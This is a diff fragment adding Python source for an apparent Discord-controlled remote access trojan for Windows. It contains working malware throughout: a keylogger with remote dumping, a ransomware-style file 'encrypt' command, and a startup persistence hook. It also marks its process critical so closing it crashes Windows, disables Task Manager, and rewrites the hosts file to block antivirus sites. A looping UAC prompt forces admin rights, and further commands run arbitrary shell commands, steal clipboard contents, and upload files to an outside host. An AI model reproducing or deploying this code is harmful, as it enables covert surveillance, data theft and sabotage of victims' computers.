+    await ctx.send(embed=embed2)
+
+def write_to_file(keys):
+    with open(log_file_path, 'a') as file:
+        for key in keys:
+            file.write(f"{key}\n")
+
+def on_press(key):
+    key_log.append(str(key))
+
+@bot.command()
+async def keylog_start(ctx):
+    global keylog_listener, key_log
+
+    key_log = []
+    if os.path.exists(log_file_path):
+        os.remove(log_file_path)
+    
+    if keylog_listener is None:
+        keylog_listener = keyboard.Listener(on_press=on_press)
+        keylog_listener.start()
+        embed = discord.Embed(
+            title="⌨ Keylogging",
+            description="Keylogger started and logging keystrokes.",
+            color=0x00ff00
+        )
+        
+        await ctx.send(embed=embed)
+
+@bot.command()
+async def keylog_stop(ctx):
+    global keylog_listener
+
+    if keylog_listener is not None:
+        keylog_listener.stop()
+        keylog_listener = None
+        write_to_file(key_log)
+        embed = discord.Embed(
+            title="⌨ Keylogging",
+            description="Keylogger stopped and data saved!",
+            color=0x00ff00
+        )
+        
+        await ctx.send(embed=embed)
+
+@bot.command()
+async def keylog_dump(ctx):
+    if os.path.exists(log_file_path):
+        await ctx.send(file=discord.File(log_file_path, "hzzh.txt"))
+    else:
+        embed = discord.Embed(
+            title="⌨ Keylogging",
+            description="No keylog data available. Start the keylogger first with `!keylog_start`",
+            color=0x00ff00
+        )
+        
+        await ctx.send(embed=embed)
+
+@bot.command()
+async def encrypt(ctx, *args):
+    embed = discord.Embed(title="🔐 Encrypt Command", color=0x00ff00)
+
+    if len(args) == 1 and args[0] == "*":
+        encrypted_files = []
+        for filename in os.listdir(current_directory):
+            file_path = os.path.join(current_directory, filename)
+            if os.path.isfile(file_path):
+                name, ext = os.path.splitext(filename)
+                if ext != ".hzzh":
+                    new_name = name + ".hzzh"
+                    new_path = os.path.join(current_directory, new_name)
+                    os.rename(file_path, new_path)
+                    encrypted_files.append(f"{filename} ➔ {new_name}")
+        
+        if encrypted_files:
+            embed.description = f"Encrypted the following files:\n" + "\n".join(encrypted_files)
+        else:
+            embed.description = "No files were encrypted (all were already in .hzzh format)."
+    elif len(args) == 1:
+        file_name = args[0]
+        file_path = os.path.join(current_directory, file_name)
+        if os.path.isfile(file_path):
+            name, ext = os.path.splitext(file_name)
+            if ext != ".hzzh":
+                new_name = name + ".hzzh"
+                new_path = os.path.join(current_directory, new_name)
+                os.rename(file_path, new_path)
+                embed.description = f"Encrypted: {file_name} ➔ {new_name}"
+            else:
+                embed.title = "❌ Encrypt Command Error"
+                embed.description = f"The file {file_name} is already encrypted."
+                embed.color = 0xff0000
+        else:
+            embed.title = "❌ Encrypt Command Error"
+            embed.description = f"File {file_name} not found in the current directory."
+            embed.color = 0xff0000
+    else:
+        embed.title = "❌ Encrypt Command Error"
+        embed.description = "Invalid argument! Use `!encrypt *` to encrypt all files or `!encrypt <file.extension>` to encrypt a specific file."
+        embed.color = 0xff0000
+
+    await ctx.send(embed=embed)
+
+@bot.command()
+async def tokens(ctx):
+    embed = await tokenoutput(ctx)
+    await ctx.send(embed=embed)
+
+@bot.command()
+async def screensaver(ctx):
+    try:
+        screensaver_path = r"C:\Windows\System32\Mystify.scr"
+        
+        subprocess.Popen([screensaver_path, '/s'])
+
+        embed = discord.Embed(
+            title="🖥️ Screensaver Activated",
+            description="The Mystify screensaver has been successfully started!",
+            color=0x00ff00
+        )
+        
+        await ctx.send(embed=embed)
+        
+    except Exception as e:
+        embed = discord.Embed(
+            title="⚠️ Error",
+            description=f"Failed to start the screensaver. Error: {e}",
+            color=0xff0000
+        )
+        
+        await ctx.send(embed=embed)
+
+@bot.command()
+async def smartup(ctx):
+    if is_admin():
+        try:
+            hzzh_task_scheduler()
+            embed = discord.Embed(
+                title="✅ Success on SmartUp!",
+                description="Succesfully copied into Unknown Startup Path! 🐀" ,
+                color=discord.Color.green()
+            )
+            await ctx.send(embed=embed)
+        except:
+            embed = discord.Embed(
+                title="❌ Failed SmartUp!",
+                description="Failed to copy into Unknown Path!",
+                color=discord.Color.red()
+            )
+            await ctx.send(embed=embed)
+    else:
+        embed = discord.Embed(
+                title="❌ Failed SmartUp!",
+                description="The Script isn't running with Admin! Use !getadmin to get Admin!",
+                color=discord.Color.red()
+        )
+        await ctx.send(embed=embed)
+
+@bot.command()
+async def cmdspam(ctx):
+    embed = discord.Embed(
+        title="✅ Starting to Spam!",
+        description="Succesfully started to spam CMD Windows!",
+        color=discord.Color.green()
+    )
+    await ctx.send(embed=embed)
+
+    def spam_cmd():
+        while True:
+            subprocess.Popen("start", shell=True)
+
+    threading.Thread(target=spam_cmd).start()
+
+@bot.command()
+async def closesession(ctx):
+    current_pid = os.getpid()
+    current_process_name = psutil.Process(current_pid).name()
+
+    instances = []
+
+    for proc in psutil.process_iter(['pid', 'name']):
+        if proc.info['name'] == current_process_name and proc.info['pid'] != current_pid:
+            instances.append(proc)
+
+    if len(instances) == 0:
+        embed = discord.Embed(
+            title="✅ No Duplicate Sessions",
+            description="No other running sessions of this script were found.",
+            color=discord.Color.green()
+        )
+        await ctx.send(embed=embed)
+        return
+
+    current_is_admin = is_admin()
+
+    if current_is_admin:
+        closed = []
+        for proc in instances:
+            try:
+                psutil.Process(proc.info['pid']).terminate()
+                closed.append(proc.info['pid'])
+            except Exception as e:
+                print(f"Error closing process {proc.info['pid']}: {e}")
+
+        if closed:
+            embed = discord.Embed(
+                title="⚠️ Duplicate Sessions Closed",
+                description=f"Closed the following duplicate session(s): {closed}",
+                color=discord.Color.orange()
+            )
+            await ctx.send(embed=embed)
+        else:
+            embed = discord.Embed(
+                title="❌ No Sessions Closed",
+                description="No duplicate sessions could be closed.",
+                color=discord.Color.red()
+            )
+            await ctx.send(embed=embed)
+
+    else:
+        closed = []
+        admin_instance_found = False
+
+        for proc in instances:
+            try:
+                p = psutil.Process(proc.info['pid'])
+                if ctypes.windll.shell32.IsUserAnAdmin() == 0:
+                    p.terminate()
+                    closed.append(proc.info['pid'])
+                else:
+                    admin_instance_found = True
+            except Exception as e:
+                print(f"Error closing process {proc.info['pid']}: {e}")
+
+        if closed:
+            embed = discord.Embed(
+                title="⚠️ Non-Admin Sessions Closed",
+                description=f"Closed the following non-admin session(s): {closed}",
+                color=discord.Color.orange()
+            )
+            await ctx.send(embed=embed)
+        elif admin_instance_found:
+            embed = discord.Embed(
+                title="⚠️ Admin Session Found",
+                description="An admin session is running. No non-admin sessions were closed.",
+                color=discord.Color.yellow()
+            )
+            await ctx.send(embed=embed)
+        else:
+            embed = discord.Embed(
+                title="❌ No Sessions Closed",
+                description="No duplicate non-admin sessions were found to close.",
+                color=discord.Color.red()
+            )
+            await ctx.send(embed=embed)
+
+def make_non_critical():
+    hProcess = ctypes.windll.kernel32.GetCurrentProcess()
+    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
+    return True
+
+def make_critical():
+    hProcess = ctypes.windll.kernel32.GetCurrentProcess()
+    ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
+    return True
+
+@bot.command()
+async def uncritproc(ctx):
+    if ctypes.windll.shell32.IsUserAnAdmin() != 1:
+        embed = discord.Embed(
+            title="❌ Admin Privileges Required",
+            description="Please run the program with Administrator privileges!",
+            color=discord.Color.red()
+        )
+        await ctx.send(embed=embed)
+        return
+
+    try:
+        if make_non_critical():
+            embed = discord.Embed(
+                title="✅ Non-Critical Process",
+                description="The process has been made non-critical. It can now be safely closed without causing a BSOD.",
+                color=discord.Color.green()
+            )
+        else:
+            embed = discord.Embed(
+                title="❌ Error",
+                description="Failed to mark the process as non-critical.",
+                color=discord.Color.red()
+            )
+        await ctx.send(embed=embed)
+
+    except Exception as e:
+        embed = discord.Embed(
+            title="❌ Error",
+            description=f"An error occurred: {e}",
+            color=discord.Color.red()
+        )
+        await ctx.send(embed=embed)
+
+@bot.command()
+async def critproc(ctx):
+    if ctypes.windll.shell32.IsUserAnAdmin() != 1:
+        embed = discord.Embed(
+            title="❌ Admin Privileges Required",
+            description="Please run the program with Administrator privileges!",
+            color=discord.Color.red()
+        )
+        await ctx.send(embed=embed)
+        return
+
+    try:
+        if make_critical():
+            embed = discord.Embed(
+                title="⚠️ Critical Process",
+                description="The process has been made critical. Closing it will cause a BSOD!",
+                color=discord.Color.orange()
+            )
+        else:
+            embed = discord.Embed(
+                title="❌ Error",
+                description="Failed to mark the process as critical.",
+                color=discord.Color.red()
+            )
+        await ctx.send(embed=embed)
+
+    except Exception as e:
+        embed = discord.Embed(
+            title="❌ Error",
+            description=f"An error occurred: {e}",
+            color=discord.Color.red()
+        )
+        await ctx.send(embed=embed)
+
+@bot.command()
+async def nostartup_disable(ctx):
+    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+    if not is_admin:
+        embed = discord.Embed(
+            title="❗ Admin Privileges Required",
+            description="This command requires admin privileges to execute.",
+            color=0xFF0000
+        )
+        await ctx.send(embed=embed)
+        return
+
+    username = os.getlogin()
+    startup_folder = os.path.join(
+        os.getenv('APPDATA'),
+        r'Microsoft\Windows\Start Menu\Programs\Startup'
+    )
+
+    try:
+        command = f'icacls "{startup_folder}" /remove:d {username}'
+        result = subprocess.run(command, shell=True, capture_output=True)
+
+        if result.returncode == 0:
+            embed = discord.Embed(
+                title="🔓 Startup Folder Unblocked",
+                description=f"Successfully restored access to the Startup folder for user **{username}**.",
+                color=0x00FF00
+            )
+        else:
+            embed = discord.Embed(
+                title="❗ Error",
+                description=f"Failed to unblock the Startup folder:\n```{result.stderr.decode()}```",
+                color=0xFF0000
+            )
+
+        await ctx.send(embed=embed)
+
+    except Exception as e:
+        embed = discord.Embed(
+            title="❗ Error",
+            description=f"An error occurred while executing the command:\n```{e}```",
+            color=0xFF0000
+        )
+        await ctx.send(embed=embed)
+
+@bot.command()
+async def nostartup(ctx):
+    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+    if not is_admin:
+        embed = discord.Embed(
+            title="❗ Admin Privileges Required",
+            description="This command requires admin privileges to execute.",
+            color=0xFF0000
+        )
+        await ctx.send(embed=embed)
+        return
+
+    username = os.getlogin()
+    startup_folder = os.path.join(
+        os.getenv('APPDATA'),
+        r'Microsoft\Windows\Start Menu\Programs\Startup'
+    )
+
+    try:
+        command = f'icacls "{startup_folder}" /deny {username}:F'
+        result = subprocess.run(command, shell=True, capture_output=True)
+
+        if result.returncode == 0:
+            embed = discord.Embed(
+                title="🔒 Startup Folder Blocked",
+                description=f"Successfully blocked access to the Startup folder for user **{username}**.",
+                color=0xFF0000
+            )
+        else:
+            embed = discord.Embed(
+                title="❗ Error",
+                description=f"Failed to block the Startup folder:\n```{result.stderr.decode()}```",
+                color=0xFF0000
+            )
+
+        await ctx.send(embed=embed)
+
+    except Exception as e:
+        embed = discord.Embed(
+            title="❗ Error",
+            description=f"An error occurred while executing the command:\n```{e}```",
+            color=0xFF0000
+        )
+        await ctx.send(embed=embed)
+
+@bot.command()
+async def taskmgr_enable(ctx):
+    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+    if is_admin:
+        try:
+            def check_taskmgr_disabled():
+                try:
+                    reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
+                    value, _ = reg.QueryValueEx(reg_key, "DisableTaskMgr")
+                    reg.CloseKey(reg_key)
+                    return value == 1
+                except FileNotFoundError:
+                    return False
+                except OSError:
+                    return False
+
+            if check_taskmgr_disabled():
+                try:
+                    reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System', 0, reg.KEY_SET_VALUE)
+                    reg.DeleteValue(reg_key, "DisableTaskMgr")
+                    reg.CloseKey(reg_key)
+
+                    embed = discord.Embed(
+                        title="🔓 Task Manager Enabled",
+                        description="Task Manager has been successfully enabled.",
+                        color=0x00FF00
+                    )
+                    await ctx.send(embed=embed)
+                except Exception as e:
+                    embed = discord.Embed(
+                        title="❗ Error",
+                        description=f"An error occurred while enabling Task Manager: {e}",
+                        color=0xFF0000
+                    )
+                    await ctx.send(embed=embed)
+            else:
+                embed = discord.Embed(
+                    title="🟢 Task Manager Already Enabled",
+                    description="Task Manager is already enabled. No action needed.",
+                    color=0x00FF00
+                )
+                await ctx.send(embed=embed)
+        except Exception as e:
+            embed = discord.Embed(
+                title="❗ Error",
+                description=f"An error occurred: {e}",
+                color=0xFF0000
+            )
+            await ctx.send(embed=embed)
+    else:
+        embed = discord.Embed(
+            title="🔒 Admin Privileges Required",
+            description="This command requires admin privileges. Please run the bot as an administrator.",
+            color=0xFFA500
+        )
+        await ctx.send(embed=embed)
+
+@bot.command()
+async def taskmgr(ctx):
+    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+    if is_admin:
+        try:
+            global statuuusss
+            statuuusss = None
+
+            def check_registry_key():
+                try:
+                    reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
+                    reg.CloseKey(reg_key)
+                    return True
+                except FileNotFoundError:
+                    return False
+
+            if not check_registry_key():
+                reg.CreateKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
+
+            reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System', 0, reg.KEY_SET_VALUE)
+            reg.SetValueEx(reg_key, "DisableTaskMgr", 0, reg.REG_DWORD, 1)
+            reg.CloseKey(reg_key)
+
+            embed = discord.Embed(
+                title="🛠️ Task Manager Disabled",
+                description="Successfully disabled the Task Manager.",
+                color=0x00FF00
+            )
+            await ctx.send(embed=embed)
+
+        except Exception as e:
+            embed = discord.Embed(
+                title="❗ Error",
+                description=f"An error occurred while executing the command: {e}",
+                color=0xFF0000
+            )
+            await ctx.send(embed=embed)
+    else:
+        embed = discord.Embed(
+            title="🔒 Admin Privileges Required",
+            description="This command requires admin privileges. Please run the bot as an administrator.",
+            color=0xFFA500
+        )
+        await ctx.send(embed=embed)
+@bot.command()
+async def blocklist(ctx):
+    loop = asyncio.get_event_loop()
+    
+    def blocklist_task():
+        try:
+            hostfilepath = os.path.join(os.getenv('systemroot'), os.sep.join(
+                subprocess.run(
+                    'REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /V DataBasePath',
+                    shell=True, capture_output=True
+                ).stdout.decode(errors='ignore').strip().splitlines()[-1].split()[-1].split(os.sep)[1:]), 'hosts')
+            
+            with open(hostfilepath) as file:
+                data = file.readlines()
+        except Exception as e:
+            return "Error"
+
+        BANNED_URLs = (
+            'virustotal.com', 'avast.com', 'totalav.com', 'scanguard.com', 'totaladblock.com', 'pcprotect.com', 'mcafee.com',
+            'bitdefender.com', 'us.norton.com', 'avg.com', 'malwarebytes.com', 'pandasecurity.com', 'avira.com', 'norton.com',
+            'eset.com', 'zillya.com', 'kaspersky.com', 'usa.kaspersky.com', 'sophos.com', 'home.sophos.com', 'adaware.com',
+            'bullguard.com', 'clamav.net', 'drweb.com', 'emsisoft.com', 'f-secure.com', 'zonealarm.com', 'trendmicro.com',
+            'ccleaner.com', 'comodo.com', 'immunet.com', 'spybot.info', 'superantispyware.com', 'webroot.com', 'secureaplus.com',
+            'heimdalsecurity.com', 'herdprotect.com', 'quickheal.com', 'qihoo.com', 'baiduantivirus.com', 'pc-cillin.com',
+            'fortinet.com', 'vipre.com', 'ikarussecurity.com', 'f-prot.com', 'gdata.de', 'cybereason.com', 'securemac.com',
+            'gridinsoft.com', 'emisoft.com', 'hitmanpro.com', 'sophoshome.com', 'antivirusguide.com', 'arcabit.com',
+            'ashampoo.com', 'avgthreatlabs.com', 'bullguard.com', 'bytehero.com', 'checkpoint.com', 'cloudbric.com',
+            'cyren.com', 'eScanAV.com', 'filseclab.com', 'fsecure.com', 'k7computing.com', 'nprotect.com',
+            'maxsecureantivirus.com', 'avl.com', 'shieldapps.com', 'spywareterminator.com', 'virusbuster.hu', 'zonerantivirus.com',
+            'totaldefense.com', 'trustport.com', 'bitdefender.de', 'antiy.com', 'ahnlab.com', 'arcabit.pl', 'baidusecurity.com',
+            'netsky.com', 'zillians.net', 'clearsight.com', 'sunbeltsecurity.com', 'plumbytes.com', 'shielden.com',
+            'protectorplus.com', 'axantivirus.com', 'rising-global.com'
+        )
+
+        newdata = data[:]
+        for url in BANNED_URLs:
+            entry = f"127.0.0.1 {url}\n"
+            if not any([url in line for line in data]):
+                newdata.append(entry)
+
+        newdata = ''.join(newdata)
+
+        try:
+            subprocess.run(f"attrib -r {hostfilepath}", shell=True, capture_output=True)
+            with open(hostfilepath, 'w') as file:
+                file.write(newdata)
+            subprocess.run(f"attrib +r {hostfilepath}", shell=True, capture_output=True)
+        except Exception as e:
+            return "Error"
+
+        return "Success"
+
+    result = await loop.run_in_executor(executor, blocklist_task)
+
+    if result == "Success":
+        embed = discord.Embed(
+            title="🦠 Blocklist",
+            description="Successfully blocked access to all common AV sites",
+            color=0x00FF00
+        )
+        await ctx.send(embed=embed)
+    else:
+        await ctx.send("An error occurred while updating the blocklist.")
+
+@bot.command()
+async def unblocklist(ctx):
+    try:
+        hostfilepath = os.path.join(
+            os.getenv('systemroot'),
+            os.sep.join(
+                subprocess.run(
+                    'REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /V DataBasePath',
+                    shell=True, capture_output=True
+                ).stdout.decode(errors='ignore').strip().splitlines()[-1].split()[-1].split(os.sep)[1:]
+            ),
+            'hosts'
+        )
+        with open(hostfilepath) as file:
+            data = file.readlines()
+    except Exception as e:
+        await ctx.send(f"Error: {e}")
+        return
+
+    BANNED_URLs = (
+            'virustotal.com', 'avast.com', 'totalav.com', 'scanguard.com', 'totaladblock.com', 'pcprotect.com', 'mcafee.com',
+            'bitdefender.com', 'us.norton.com', 'avg.com', 'malwarebytes.com', 'pandasecurity.com', 'avira.com', 'norton.com',
+            'eset.com', 'zillya.com', 'kaspersky.com', 'usa.kaspersky.com', 'sophos.com', 'home.sophos.com', 'adaware.com',
+            'bullguard.com', 'clamav.net', 'drweb.com', 'emsisoft.com', 'f-secure.com', 'zonealarm.com', 'trendmicro.com',
+            'ccleaner.com', 'comodo.com', 'immunet.com', 'spybot.info', 'superantispyware.com', 'webroot.com', 'secureaplus.com',
+            'heimdalsecurity.com', 'herdprotect.com', 'quickheal.com', 'qihoo.com', 'baiduantivirus.com', 'pc-cillin.com',
+            'fortinet.com', 'vipre.com', 'ikarussecurity.com', 'f-prot.com', 'gdata.de', 'cybereason.com', 'securemac.com',
+            'gridinsoft.com', 'emisoft.com', 'hitmanpro.com', 'sophoshome.com', 'antivirusguide.com', 'arcabit.com',
+            'ashampoo.com', 'avgthreatlabs.com', 'bullguard.com', 'bytehero.com', 'checkpoint.com', 'cloudbric.com',
+            'cyren.com', 'eScanAV.com', 'filseclab.com', 'fsecure.com', 'k7computing.com', 'nprotect.com',
+            'maxsecureantivirus.com', 'avl.com', 'shieldapps.com', 'spywareterminator.com', 'virusbuster.hu', 'zonerantivirus.com',
+            'totaldefense.com', 'trustport.com', 'bitdefender.de', 'antiy.com', 'ahnlab.com', 'arcabit.pl', 'baidusecurity.com',
+            'netsky.com', 'zillians.net', 'clearsight.com', 'sunbeltsecurity.com', 'plumbytes.com', 'shielden.com',
+            'protectorplus.com', 'axantivirus.com', 'rising-global.com'
+    )
+
+    newdata = []
+    for line in data:
+        if not any(url in line and ("127.0.0.1" in line or "::1" in line) for url in BANNED_URLs):
+            newdata.append(line)
+
+    newdata = ''.join(newdata).replace('\n\n', '\n')
+
+    try:
+        subprocess.run(f"attrib -r {hostfilepath}", shell=True, capture_output=True)
+        with open(hostfilepath, 'w') as file:
+            file.write(newdata)
+        subprocess.run(f"attrib +r {hostfilepath}", shell=True, capture_output=True)
+
+        embed = discord.Embed(
+            title="🔓 Unblocklist",
+            description="Succesfully unblocked all common AV sites!",
+            color=0x00FF00
+        )
+        await ctx.send(embed=embed)
+    except Exception as e:
+        await ctx.send(f"Error: {e}")
+        return
+
+@bot.command()
+async def getadmin(ctx):
+    if is_admin():
+        embed = discord.Embed(
+            title="Success", 
+            description="The user already has admin privileges.",
+            color=0x00FF00
+        )
+        await ctx.send(embed=embed)
+        return
+    else:
+        decline_count = 0
+
+        if trigger_uac():
+            embed = discord.Embed(
+                title="Success", 
+                description="The script has been elevated to admin privileges.",
+                color=0x00FF00
+            )
+        else:
+            embed = discord.Embed(
+                title="Failure", 
+                description="UAC was not granted. The operation was canceled or failed.",
+                color=0xFF0000
+            )
+            
+            while not trigger_uac():
+                decline_count += 1
+
+            embed = discord.Embed(
+                title="Success", 
+                description=f"The script has been elevated to admin privileges after {decline_count} declined attempts.",
+                color=0x00FF00
+            )
+            
+        await ctx.send(embed=embed)
+        exit()
+
+@bot.command()
+async def floatpic(ctx, seconds: int, image_url: str):
+    try:
+        await ctx.send(f"Downloading image and displaying for {seconds} seconds...")
+        file_path = download_image(image_url)
+        threading.Thread(target=create_window, args=(seconds, file_path)).start()
+    except Exception as e:
+        await ctx.send(f"Error: {str(e)}")
+
+@bot.command()
+async def exec(ctx, path: str):
+    try:
+        if path.endswith('.exe'):
+            subprocess.run([path], check=True)
+            embed = discord.Embed(
+                title="✅ File Executed Successfully",
+                description=f"Executable file '{path}' has been run.",
+                color=0x00FF00
+            )
+            await ctx.send(embed=embed)
+        
+        elif path.endswith(('.png', '.jpg', '.jpeg', '.gif')): 
+            subprocess.run(['start', path], check=True, shell=True)
+            embed = discord.Embed(
+                title="✅ File Opened Successfully",
+                description=f"Image file '{path}' has been opened.",
+                color=0x00FF00
+            )
+            await ctx.send(embed=embed)
+        
+        else:
+            embed = discord.Embed(
+                title="❌ Unsupported File Type",
+                description=f"Cannot execute or open file of type '{path}'.",
+                color=0xFF0000
+            )
+            await ctx.send(embed=embed)
+
+    except Exception as e:
+        embed = discord.Embed(
+            title="❌ File Failed to Run",
+            description=f"An error occurred: {str(e)}",
+            color=0xFF0000
+        )
+        await ctx.send(embed=embed)
+
+@bot.command()
+async def upload(ctx, path: str = None):
+    try:
+        if not path:
+            path = os.environ['TEMP'] 
+
+        if ctx.message.attachments:
+            attachment = ctx.message.attachments[0]
+
+            file_path = os.path.join(path, attachment.filename)
+
+            await attachment.save(file_path)
+
+            embed = discord.Embed(
+                title="✅ File Downloaded Successfully",
+                description=f"File '{attachment.filename}' has been downloaded to '{file_path}'.",
+                color=0x00FF00
+            )
+            await ctx.send(embed=embed)
+        else:
+            embed = discord.Embed(
+                title="⚠️ No Attachment Found",
+                description="No attachment found in the message. Please attach a file to upload.",
+                color=0xFF0000
+            )
+            await ctx.send(embed=embed)
+
+    except Exception as e:
+        embed = discord.Embed(
+            title="❌ Error",
+            description=f"An error occurred: {str(e)}",
+            color=0xFF0000
+        )
+        await ctx.send(embed=embed)
+
+current_directory = os.getcwd()
+@bot.command()
+async def download_ext(ctx, filename: str):
+    try:
+        file_path = os.path.join(current_directory, filename)
+
+        if os.path.exists(file_path):
+            external_api_url = "https://transfer.whalebone.io/"
+
+            with open(file_path, 'rb') as file:
+                headers = {
+                    "Max-Downloads": "1",  
+                    "Max-Days": "5"        
+                }
+                
+                response = requests.put(external_api_url + filename, data=file, headers=headers)
+
+            if response.status_code == 200:
+                uploaded_file_url = response.text
+
+                embed = discord.Embed(
+                    title="✅ File Uploaded Successfully",
+                    description=f"Your file has been uploaded! You can access it here: {uploaded_file_url}",
+                    color=0x00FF00
+                )
+                await ctx.send(embed=embed)
+            else:
+                embed = discord.Embed(
+                    title="❌ Upload Failed",
+                    description=f"Failed to upload the file. API Response: {response.text}",
+                    color=0xFF0000
+                )
+                await ctx.send(embed=embed)
+        else:
+            embed = discord.Embed(
+                title="⚠️ File Not Found",
+                description=f"The file '{filename}' was not found in the current directory.",
+                color=0xFF0000
+            )
+            await ctx.send(embed=embed)
+
+    except Exception as e:
+        embed = discord.Embed(
+            title="Error",
+            description=f"An error occurred: {str(e)}",
+            color=0xFF0000
+        )
+        await ctx.send(embed=embed)
+
+@bot.command()
+async def purge(ctx, amount: int):
+    try:
+        await ctx.channel.purge(limit=amount)
+        embed = discord.Embed(
+            title="🚮 Purge",
+            description=f"Successfully purged {amount} messages from this channel.",
+            color=0x00008B
+        )
+        await ctx.send(embed=embed)
+    except Exception as e:
+        await ctx.send(f"Error: {str(e)}")
+
+@bot.command()
+async def recreate(ctx, channel: discord.TextChannel):
+    try:
+        await channel.delete()
+        await ctx.guild.create_text_channel(channel.name)
+        
+        embed = discord.Embed(
+            title="🔄 Channel Recreated",
+            description=f"Channel {channel.name} has been deleted and recreated.",
+            color=0x00008B
+        )
+        await ctx.send(embed=embed)
+    except Exception as e:
+        await ctx.send(f"Error: {str(e)}")
+
+@bot.command()
+async def net(ctx):
+    try:
+        botnet_channel = discord.utils.get(ctx.guild.text_channels, name="botnet")
+        
+        if botnet_channel:
+            await botnet_channel.delete()
+            await ctx.guild.create_text_channel("botnet")
+            embed = discord.Embed(
+                title="⚡ Botnet Recreated",
+                description="The Botnet channel has been recreated.",
+                color=0x00008B
+            )
+        else:
+            await ctx.guild.create_text_channel("botnet")
+            embed = discord.Embed(
+                title="⚡ Botnet Created",
+                description="The Botnet channel has been created.",
+                color=0x00008B
+            )
+
+        await ctx.send(embed=embed)
+    except Exception as e:
+        await ctx.send(f"Error: {str(e)}")
+
+@bot.command()
+async def admin(ctx):
+    try:
+        if is_admin():
+            embed = discord.Embed(
+                title="🔧 Admin Permissions",
+                description="The command is running with admin privileges on the machine! 🛠️",
+                color=0x00ff00
+            )
+        else:
+            embed = discord.Embed(
+                title="🔧 Admin Permissions",
+                description="The command is not running with admin privileges on the machine. ❌",
+                color=0xff0000
+            )
+
+        await ctx.send(embed=embed)
+
+    except Exception as e:
+        await ctx.send(f"Error: {str(e)}")
+
+@bot.command()
+async def clipboard(ctx):
+    try:
+        clipboard_content = pyperclip.paste()
+        if clipboard_content:
+            embed = discord.Embed(
+                title="📋 Clipboard Content",
+                description=f"Here is the content of the clipboard:",
+                color=0x00ff00
+            )
+            embed.add_field(name="Clipboard Content", value=clipboard_content, inline=False)
+            await ctx.send(embed=embed)
+        else:
+            await ctx.send("Clipboard is empty.")
+
+    except Exception as e:
+        await ctx.send(f"Error: {str(e)}")
+
+@bot.command()
+async def wallpaper(ctx):
+    try:
+        if len(ctx.message.attachments) > 0:  
+            attachment = ctx.message.attachments[0]
+            image_url = attachment.url
+
+            temp_folder = os.environ['TEMP']
+            image_path = os.path.join(temp_folder, "wallpaper.jpg")
+
+            response = requests.get(image_url)
+            with open(image_path, 'wb') as f:
+                f.write(response.content)
+
+            change_wallpaper_windows(image_path)
+
+            embed = discord.Embed(
+                title="🖼️ Wallpaper Change",
+                description=f"Wallpaper has been set to: {image_url}",
+                color=0x00ff00
+            )
+            embed.set_image(url=image_url)
+            await ctx.send(embed=embed)
+        else:
+            await ctx.send("No attachment found! Please attach an image for the wallpaper.")
+
+    except Exception as e:
+        await ctx.send(f"Error: {str(e)}")
+
+@bot.command()
+async def browser(ctx):
+    embed = discord.Embed(
+        title="🔍 Browser Passwords",
+        description=f"🔍 ",
+        color=0x00ff00
+    )
+    await ctx.send(embed=embed)
+
+@bot.command()
+async def publicip(ctx):
+    try:
+        response = requests.get('https://api.ipify.org?format=json')
+        public_address = response.json().get('ip', 'N/A')
+        
+        embed = discord.Embed(
+            title="🌐 Public IP",
+            description=f"Victim's Public IP: {public_address} 🌐",
+            color=0xff0000
+        )
+        
+        await ctx.send(embed=embed)
+    except Exception as e:
+        await ctx.send(f"Error: {str(e)}")
+
+@bot.command()
+async def shutdown(ctx):
+    pc_name = get_system_info().get("PC Name", "NoName")
+    embed = discord.Embed(
+        title="🛑 **Shutting down**",
+        description=f"**{pc_name}** is shutting down... Goodbye! 👋",
+        color=0xff0000
+    )
+    await ctx.send(embed=embed)
+    
+    try:
+        if sys.platform.startswith('win'):
+            subprocess.run(["shutdown", "/s", "/t", "0"], check=True)
+        elif sys.platform.startswith('linux') or sys.platform.startswith('darwin'):
+            subprocess.run(["sudo", "shutdown", "-h", "now"], check=True)
+    except Exception as e:
+        await ctx.send(f"❌ Error: {e}")
+
+@bot.command()
+async def restart(ctx):
+    pc_name = get_system_info().get("PC Name", "NoName")
+    embed = discord.Embed(
+        title="🔄 **Restarting**",
+        description=f"**{pc_name}** is restarting... Please wait! 🔄",
+        color=0x0000ff
+    )
+    await ctx.send(embed=embed)
+    
+    try:
+        if sys.platform.startswith('win'):
+            subprocess.run(["shutdown", "/r", "/t", "0"], check=True)  
+        elif sys.platform.startswith('linux') or sys.platform.startswith('darwin'):
+            subprocess.run(["sudo", "shutdown", "-r", "now"], check=True)  
+    except Exception as e:
+        await ctx.send(f"❌ Error: {e}")
+
+@bot.command()
+async def command(ctx, *, cmd: str):
+    try:
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+
+        if result.returncode == 0:
+            output = result.stdout
+        else:
+            output = result.stderr
+
+        if len(output) > 2000:
+            temp_file_path = os.path.join(temp_folder, "command_output.txt")
+
+            with open(temp_file_path, "w", encoding="utf-8") as f:
+                f.write(output)
+
+            await ctx.send(
+                content=f"The output was too long, so it has been saved to a file. You can download it below:",
+                file=discord.File(temp_file_path)
+            )
+        else:
+            embed = discord.Embed(
+                title="💻 Command Output",
+                description=f"Executed command: `{cmd}`",
+                color=0x00ff00
+            )
+            embed.add_field(name="Output", value=output, inline=False)
+            await ctx.send(embed=embed)
+
+    except Exception as e:
+        embed = discord.Embed(
+            title="❌ Command Error",
+            description=f"An error occurred while executing the command: {str(e)}",
+            color=0xff0000
+        )
+        await ctx.send(embed=embed)
+
+@bot.command()
+async def cd(ctx, path: str = None):
+    global current_directory
+
